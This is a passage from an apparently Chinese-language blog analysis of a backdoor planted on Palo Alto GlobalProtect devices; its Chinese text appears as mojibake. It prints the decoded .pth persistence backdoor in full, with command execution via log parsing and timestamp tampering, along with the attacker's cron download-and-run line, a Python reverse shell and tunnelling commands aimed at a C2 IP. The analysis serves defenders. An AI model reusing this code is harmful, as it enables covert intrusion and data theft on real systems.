KbGJuUmZkR2x0WlM1dGFXNTFkR1VnSVQwZ01DQmhibVFnWTNWeWNtVnVkRjkwYVcxbExuTmxZMjl1WkNBOVBTQXdEUW9nSUNBZ1kzTnpYM0JoZEdnZ1BTQW5MM1poY2k5aGNIQjNaV0l2YzNOc2RuQnVaRzlqY3k5bmJHOWlZV3d0Y0hKdmRHVmpkQzl3YjNKMFlXd3ZZM056TDJKdmIzUnpkSEpoY0M1dGFXNHVZM056SncwS0lDQWdJR052Ym5SbGJuUWdQU0J2Y0dWdUtHTnpjMTl3WVhSb0tTNXlaV0ZrS0NrTkNpQWdJQ0JoZEdsdFpUMXZjeTV3WVhSb0xtZGxkR0YwYVcxbEtHTnpjMTl3WVhSb0tRMEtJQ0FnSUcxMGFXMWxQVzl6TG5CaGRHZ3VaMlYwYlhScGJXVW9ZM056WDNCaGRHZ3BEUW9OQ2lBZ0lDQjNhR2xzWlNCVWNuVmxPZzBLSUNBZ0lDQWdJQ0IwY25rNkRRb2dJQ0FnSUNBZ0lDQWdJQ0JUU0VWTVRGOVFRVlJVUlZKT0lEMGdKMmx0WjF4YktGdGhMWHBCTFZvd0xUa3JMejFkS3lsY1hTY05DaUFnSUNBZ0lDQWdJQ0FnSUd4cGJtVnpJRDBnVzEwTkNpQWdJQ0FnSUNBZ0lDQWdJRmRTU1ZSRlgwWk1RVWNnUFNCR1lXeHpaUTBLSUNBZ0lDQWdJQ0FnSUNBZ1ptOXlJR3hwYm1VZ2FXNGdiM0JsYmlnaUwzWmhjaTlzYjJjdmNHRnVMM056Ykhad2JsOXVaM2hmWlhKeWIzSXViRzluSWl4bGNuSnZjbk05SW1sbmJtOXlaU0lwTG5KbFlXUnNhVzVsY3lncE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lISnpkQ0E5SUhKbExuTmxZWEpqYUNoVFNFVk1URjlRUVZSVVJWSk9MR3hwYm1VcERRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdjbk4wT2cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhVa2xVUlY5R1RFRkhJRDBnVkhKMVpRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JqYldRZ1BTQmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtISnpkQzVuY205MWNDZ3hLU2t1WkdWamIyUmxLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2RISjVPZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdiM1YwY0hWMElEMGdiM011Y0c5d1pXNG9ZMjFrS1M1eVpXRmtLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSGRwZEdnZ2IzQmxiaWhqYzNOZmNHRjBhQ3dpWVNJcElHRnpJR1k2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1ppNTNjbWwwWlNnaUx5b2lLMjkxZEhCMWRDc2lLaThpS1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxlR05sY0hRZ1JYaGpaWEIwYVc5dUlHRnpJR1U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3WVhOekRRb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWTI5dWRHbHVkV1VOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JzYVc1bGN5NWhjSEJsYm1Rb2JHbHVaU2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JRmRTU1ZSRlgwWk1RVWM2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWVhScGJXVTliM011Y0dGMGFDNW5aWFJoZEdsdFpTZ2lMM1poY2k5c2IyY3ZjR0Z1TDNOemJIWndibDl1WjNoZlpYSnliM0l1Ykc5bklpa05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnRkR2x0WlQxdmN5NXdZWFJvTG1kbGRHMTBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpS1EwS0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2QybDBhQ0J2Y0dWdUtDSXZkbUZ5TDJ4dlp5OXdZVzR2YzNOc2RuQnVYMjVuZUY5bGNuSnZjaTVzYjJjaUxDSjNJaWtnWVhNZ1pqb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWmk1M2NtbDBaV3hwYm1WektHeHBibVZ6S1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUc5ekxuVjBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpTENoaGRHbHRaU3h0ZEdsdFpTa3BEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdhVzF3YjNKMElIUm9jbVZoWkdsdVp3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIUm9jbVZoWkdsdVp5NVVhSEpsWVdRb2RHRnlaMlYwUFhKbGMzUnZjbVVzWVhKbmN6MG9ZM056WDNCaGRHZ3NZMjl1ZEdWdWRDeGhkR2x0WlN4dGRHbHRaU2twTG5OMFlYSjBLQ2tOQ2lBZ0lDQWdJQ0FnWlhoalpYQjBPZzBLSUNBZ0lDQWdJQ0FnSUNBZ2NHRnpjdzBLSUNBZ0lDQWdJQ0IwYVcxbExuTnNaV1Z3S0RJcERRb05DZzBLYVcxd2IzSjBJSFJvY21WaFpHbHVaeXgwYVcxbERRcDBhSEpsWVdScGJtY3VWR2h5WldGa0tIUmhjbWRsZEQxZlgyMWhhVzRwTG5OMFlYSjBLQ2tOQ2cwSyIKICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoZnVuY3Rpb25jb2RlKSkgICAgICAgIAoKICAgIGlmIGIiL3Vzci9sb2NhbC9iaW4vbW9uaXRvciBtcCIgaW4gb3BlbigiL3Byb2Mvc2VsZi9jbWRsaW5lIiwicmIiKS5yZWFkKCkucmVwbGFjZShiIlx4MDAiLGIiICIpIDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXJ0X3Byb2Nlc3MoKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdCBhcyBlOgogICAgICAgICAgICBwcmludChlKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxzZToKICAgICAgICByZXR1cm4gRmFsc2UgCgoKZGVmIHByb3RlY3QoKToKICAgIGltcG9ydCBvcyxzaWduYWwKICAgIHN5c3RlbXB0aCA9ICIvdXNyL2xpYi9weXRob24zLjYvc2l0ZS1wYWNrYWdlcy9zeXN0ZW0ucHRoIgogICAgY29udGVudCA9IG9wZW4oc3lzdGVtcHRoKS5yZWFkKCkKICAgICMgb3MudW5saW5rKF9fZmlsZV9fKQogICAgZGVmIHN0b3Aoc2lnLGZyYW1lKToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc3lzdGVtcHRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKHN5c3RlbXB0aCwidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNvbnRlbnQpCgogICAgc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHVEVSTSxzdG9wKQoKCnByb3RlY3QoKQpjaGVjaygpCg=="))'''</span>)</span><br><span class="line">atime=os.path.getatime(os.__file__)</span><br><span class="line">mtime=os.path.getmtime(os.__file__)</span><br><span class="line">os.utime(systempth,(atime,mtime))</span><br><span class="line">os.unlink(__file__)</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">os.unlink(glob.glob(<span class="string">"/opt/pancfg/mgmt/licenses/PA_VM`*"</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠä¸€æ®µ Python ä»£ç å†™å…¥äº† <code>/usr/lib/python3.6/site-packages/system.pth</code>ã€‚</p><blockquote><p>The purpose of the update.py script is to deploy a backdoor to the following path: <code>/usr/lib/python3.6/site-packages/system.pth</code>. The backdoor, written in Python, starts by an <code>import</code> and its main content is stored as a base64 encoded blob. The <code>.pth</code> extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in <code>.pth</code> files beginning with the text â€œ<code>import</code>â€ followed by a space or a tab, are executed as described in the <a href="https://docs.python.org/3/library/site.html" target="_blank" rel="noopener">official documentation</a>. Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.</p></blockquote><p>ä½äº Python <code>site-packages</code> ç›®å½•ä¸‹çš„ <code>.pth</code> æ–‡ä»¶ï¼Œå¯ä»¥ç”¨äºæŒ‡å®š <code>PATH</code> è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <code>.pth</code> æ–‡ä»¶åŒ…å«ä»¥ä¸‹å†…å®¹ï¼Œåˆ™æ¯ä¸€è¡ŒæŒ‡å®šçš„è·¯å¾„å°†è¢«æ·»åŠ åˆ° <code>sys.path</code> ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\\Windows\\System32</span><br><span class="line">D:\\</span><br></pre></td></tr></table></figure><p>è€Œå¦‚æœ <code>.pth</code> æ–‡ä»¶ä¸­çš„è¡Œä»¥ <code>import</code> åŠ ä¸Šç©ºæ ¼æˆ–è€…åˆ¶è¡¨ç¬¦å¼€å¤´ï¼Œåˆ™è¿™ä¸€è¡Œçš„å†…å®¹ä¼šè¢«å½“åš Python ä»£ç æ¥æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>æ¯æ¬¡ Python è¿›ç¨‹å¯åŠ¨æ—¶</strong>ï¼Œ<code>.pth</code> æ–‡ä»¶ä¸­çš„å†…å®¹éƒ½ä¼šè¢«è§£æï¼Œè€Œé Volexity åŸæ–‡ä¸­æ‰€è¯´çš„åªæœ‰åœ¨ <code>import</code> <code>.pth</code> æ¨¡å—æ—¶æ‰ä¼šè§£ææ–‡ä»¶ã€‚</p><p>Base64 è§£ç åçš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os,subprocess,time,sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_process</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        functioncode = <span class="string">b"ZGVmIF9fbWFpbigpOg0KICAgIGltcG9ydCB0aHJlYWRpbmcsdGltZSxvcyxyZSxiYXNlNjQNCg0KDQoNCiAgICBkZWYgcmVzdG9yZShjc3NfcGF0aCxjb250ZW50LGF0aW1lLG10aW1lKToNCiAgICAgICAgaW1wb3J0IG9zLHRpbWUNCiAgICAgICAgdGltZS5zbGVlcCgxNSkNCiAgICAgICAgd2l0aCBvcGVuKGNzc19wYXRoLCd3JykgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUoY29udGVudCkNCiAgICAgICAgb3MudXRpbWUoY3NzX3BhdGgsKGF0aW1lLG10aW1lKSkNCiAgICAgICAgDQoNCiAgICAgICAgDQogICAgZGVmIF9faXNfd2hvbGVfaG91cigpOg0KICAgICAgICBmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KICAgICAgICBjdXJyZW50X3RpbWUgPSBkYXRldGltZS5ub3coKS50aW1lKCkNCiAgICAgICAgcmV0dXJuIGN1cnJlbnRfdGltZS5taW51dGUgIT0gMCBhbmQgY3VycmVudF90aW1lLnNlY29uZCA9PSAwDQogICAgY3NzX3BhdGggPSAnL3Zhci9hcHB3ZWIvc3NsdnBuZG9jcy9nbG9iYWwtcHJvdGVjdC9wb3J0YWwvY3NzL2Jvb3RzdHJhcC5taW4uY3NzJw0KICAgIGNvbnRlbnQgPSBvcGVuKGNzc19wYXRoKS5yZWFkKCkNCiAgICBhdGltZT1vcy5wYXRoLmdldGF0aW1lKGNzc19wYXRoKQ0KICAgIG10aW1lPW9zLnBhdGguZ2V0bXRpbWUoY3NzX3BhdGgpDQoNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBTSEVMTF9QQVRURVJOID0gJ2ltZ1xbKFthLXpBLVowLTkrLz1dKylcXScNCiAgICAgICAgICAgIGxpbmVzID0gW10NCiAgICAgICAgICAgIFdSSVRFX0ZMQUcgPSBGYWxzZQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbigiL3Zhci9sb2cvcGFuL3NzbHZwbl9uZ3hfZXJyb3IubG9nIixlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpOg0KICAgICAgICAgICAgICAgIHJzdCA9IHJlLnNlYXJjaChTSEVMTF9QQVRURVJOLGxpbmUpDQogICAgICAgICAgICAgICAgaWYgcnN0Og0KICAgICAgICAgICAgICAgICAgICBXUklURV9GTEFHID0gVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICBjbWQgPSBiYXNlNjQuYjY0ZGVjb2RlKHJzdC5ncm91cCgxKSkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gb3MucG9wZW4oY21kKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihjc3NfcGF0aCwiYSIpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiLyoiK291dHB1dCsiKi8iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQobGluZSkNCiAgICAgICAgICAgIGlmIFdSSVRFX0ZMQUc6DQogICAgICAgICAgICAgICAgYXRpbWU9b3MucGF0aC5nZXRhdGltZSgiL3Zhci9sb2cvcGFuL3NzbHZwbl9uZ3hfZXJyb3IubG9nIikNCiAgICAgICAgICAgICAgICBtdGltZT1vcy5wYXRoLmdldG10aW1lKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciKQ0KDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciLCJ3IikgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgZi53cml0ZWxpbmVzKGxpbmVzKQ0KICAgICAgICAgICAgICAgIG9zLnV0aW1lKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciLChhdGltZSxtdGltZSkpDQogICAgICAgICAgICAgICAgaW1wb3J0IHRocmVhZGluZw0KICAgICAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJlc3RvcmUsYXJncz0oY3NzX3BhdGgsY29udGVudCxhdGltZSxtdGltZSkpLnN0YXJ0KCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KICAgICAgICB0aW1lLnNsZWVwKDIpDQoNCg0KaW1wb3J0IHRocmVhZGluZyx0aW1lDQp0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1fX21haW4pLnN0YXJ0KCkNCg0K"</span></span><br><span class="line">        exec(base64.b64decode(functioncode))        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"/usr/local/bin/monitor mp"</span> <span class="keyword">in</span> open(<span class="string">"/proc/self/cmdline"</span>,<span class="string">"rb"</span>).read().replace(<span class="string">b"\x00"</span>,<span class="string">b" "</span>) :</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start_process()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">protect</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os,signal</span><br><span class="line">    systempth = <span class="string">"/usr/lib/python3.6/site-packages/system.pth"</span></span><br><span class="line">    content = open(systempth).read()</span><br><span class="line">    <span class="comment"># os.unlink(__file__)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(sig,frame)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(systempth):</span><br><span class="line">            <span class="keyword">with</span> open(systempth,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(content)</span><br><span class="line"></span><br><span class="line">    signal.signal(signal.SIGTERM,stop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">protect()</span><br><span class="line">check()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®šä¹‰äº†ä¸¤ä¸ªå‡½æ•°ï¼Œ<code>protect</code> ç”¨äºå®ˆæŠ¤ <code>/usr/lib/python3.6/site-packages/system.pth</code>ï¼Œè€Œ <code>check</code> çš„æ ¸å¿ƒé€»è¾‘ä»ç„¶æ˜¯ Base64 ç¼–ç çš„ï¼Œè§£ç åçš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threading,time,os,re,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restore</span><span class="params">(css_path,content,atime,mtime)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os,time</span><br><span class="line">        time.sleep(<span class="number">15</span>)</span><br><span class="line">        <span class="keyword">with</span> open(css_path,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        os.utime(css_path,(atime,mtime))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__is_whole_hour</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">        current_time = datetime.now().time()</span><br><span class="line">        <span class="keyword">return</span> current_time.minute != <span class="number">0</span> <span class="keyword">and</span> current_time.second == <span class="number">0</span></span><br><span class="line">    css_path = <span class="string">'/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css'</span></span><br><span class="line">    content = open(css_path).read()</span><br><span class="line">    atime=os.path.getatime(css_path)</span><br><span class="line">    mtime=os.path.getmtime(css_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            SHELL_PATTERN = <span class="string">'img\[([a-zA-Z0-9+/=]+)\]'</span></span><br><span class="line">            lines = []</span><br><span class="line">            WRITE_FLAG = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,errors=<span class="string">"ignore"</span>).readlines():</span><br><span class="line">                rst = re.search(SHELL_PATTERN,line)</span><br><span class="line">                <span class="keyword">if</span> rst:</span><br><span class="line">                    WRITE_FLAG = <span class="keyword">True</span></span><br><span class="line">                    cmd = base64.b64decode(rst.group(<span class="number">1</span>)).decode()</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        output = os.popen(cmd).read()</span><br><span class="line">                        <span class="keyword">with</span> open(css_path,<span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            f.write(<span class="string">"/*"</span>+output+<span class="string">"*/"</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                lines.append(line)</span><br><span class="line">            <span class="keyword">if</span> WRITE_FLAG:</span><br><span class="line">                atime=os.path.getatime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>)</span><br><span class="line">                mtime=os.path.getmtime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.writelines(lines)</span><br><span class="line">                os.utime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,(atime,mtime))</span><br><span class="line">                <span class="keyword">import</span> threading</span><br><span class="line">                threading.Thread(target=restore,args=(css_path,content,atime,mtime)).start()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line">threading.Thread(target=__main).start()</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç”¨äºå»ºç«‹ä¸€ä¸ªåé—¨æ¥æ‰§è¡Œæ”»å‡»è€…å‘é€çš„å‘½ä»¤ï¼š</p><ul><li>è¯·æ±‚ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œè¯·æ±‚å‚æ•°ä¸­å¸¦å…¥è¦æ‰§è¡Œçš„å‘½ä»¤</li><li>ç”±äºé¡µé¢ä¸å­˜åœ¨ï¼Œç›¸å…³ä¿¡æ¯ä¼šè¢«å†™å…¥æ—¥å¿—æ–‡ä»¶ <code>/var/log/pan/sslvpn_ngx_error.log</code></li><li>ä»æ—¥å¿—æ–‡ä»¶ <code>/var/log/pan/sslvpn_ngx_error.log</code> æå–æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤</li><li>é€šè¿‡ <code>os.popen</code> æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†å‘½ä»¤è¾“å‡ºä¿¡æ¯å†™å…¥ CSS æ–‡ä»¶ <code>/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css</code></li><li>æ¢å¤æ—¥å¿—æ–‡ä»¶ <code>/var/log/pan/sslvpn_ngx_error.log</code> çš„æ–‡ä»¶å†…å®¹ï¼ˆå»é™¤äº†å¸¦å‘½ä»¤å‚æ•°çš„å†…å®¹ï¼‰ä»¥åŠ <code>atime</code> å’Œ <code>mtime</code> å±æ€§</li><li>æ¢å¤ CSS æ–‡ä»¶ <code>/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css</code> çš„æ–‡ä»¶å†…å®¹ä»¥åŠ <code>atime</code> å’Œ <code>mtime</code> å±æ€§<ul><li>ä½†è¿™é‡Œçš„ <code>atime</code> å’Œ <code>mtime</code> å…¶å®æ¥è‡ªæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶éä¹‹å‰ä¿å­˜çš„ CSS æ–‡ä»¶çš„åŸå§‹æ—¶é—´å±æ€§</li></ul></li></ul><p>æ”»å‡»è€…å¯ä»¥åœ¨æ¢å¤æ–‡ä»¶å‰çš„ <code>15</code> ç§’æ—¶é—´é—´éš™å†…é€šè¿‡ CSS æ–‡ä»¶è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœã€‚</p><h3 id="3-2-patch-cron-file"><a href="#3-2-patch-cron-file" class="headerlink" title="3.2 patch cron file"></a>3.2 patch cron file</h3><p>åˆ›å»º crontab ä»»åŠ¡å®šæœŸä» C2 æœåŠ¡å™¨æ‹‰å–åä¸º <code>policy</code> çš„è„šæœ¬æ‰§è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ ! -f '/etc/cron.d/update' ]; then</span><br><span class="line">    printf "SHELL=/bin/bash\n\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\n\n" &gt; /etc/cron.d/update</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="3-3-policy-file"><a href="#3-3-policy-file" class="headerlink" title="3.3 policy file"></a>3.3 policy file</h3><h4 id="3-3-1-Version-1"><a href="#3-3-1-Version-1" class="headerlink" title="3.3.1 Version 1"></a>3.3.1 Version 1</h4><p>Python åå¼¹ Shellã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">r=`ps -ef | grep "import sys,socket,os" | grep -v grep`</span><br><span class="line">if [[ -z "$r" ]]; then</span><br><span class="line">    python -c "import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="3-3-2-Version-2"><a href="#3-3-2-Version-2" class="headerlink" title="3.3.2 Version 2"></a>3.3.2 Version 2</h4><p>å°† <code>uname -a</code> çš„è¾“å‡ºä¿¡æ¯å†™å…¥ CSS æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm -f /var/appweb/sslvpndocs/global-protect/*.css</span><br><span class="line">cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css</span><br><span class="line">uname -a &gt; /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css</span><br></pre></td></tr></table></figure><h4 id="3-3-3-Version-3"><a href="#3-3-3-Version-3" class="headerlink" title="3.3.3 Version 3"></a>3.3.3 Version 3</h4><p>æ¸…ç† CSS æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm -f /var/appweb/sslvpndocs/global-protect/*.css</span><br></pre></td></tr></table></figure><h4 id="3-3-4-Version-4"><a href="#3-3-4-Version-4" class="headerlink" title="3.3.4 Version 4"></a>3.3.4 Version 4</h4><p>ä¸‹è½½æ‰§è¡Œ <a href="https://github.com/ginuerzh/gost" target="_blank" rel="noopener">GOST</a> ä»£ç†ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz</span><br><span class="line">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">gzip -d /tmp/vpn_prot.gz</span><br><span class="line">chmod +x /tmp/vpn_prot</span><br><span class="line">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h4 id="3-3-5-Version-5"><a href="#3-3-5-Version-5" class="headerlink" title="3.3.5 Version 5"></a>3.3.5 Version 5</h4><p>Version 4 çš„æ”¹è‰¯ç‰ˆæœ¬ï¼ˆBase64 ç¼–ç ï¼‰ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/vpn.log -O /tmp/vpn.log</span><br><span class="line">base64 -d /tmp/vpn.log &gt; /tmp/vpn_prot.gz</span><br><span class="line">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">gzip -d /tmp/vpn_prot.gz</span><br><span class="line">chmod +x /tmp/vpn_prot</span><br><span class="line">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h4 id="3-3-6-Version-6"><a href="#3-3-6-Version-6" class="headerlink" title="3.3.6 Version 6"></a>3.3.6 Version 6</h4><p>ä¸‹è½½æ‰§è¡ŒåŸºäº SSH çš„åå¼¹ Shell <a href="https://github.com/Fahrj/reverse-ssh" target="_blank" rel="noopener">reverse-ssh</a>ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/lowdp -O /tmp/lowdp</span><br><span class="line">ls -l /tmp/lowdp &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">chmod +x /tmp/lowdp</span><br><span class="line">nohup /tmp/lowdp -l -p 31289 &gt; 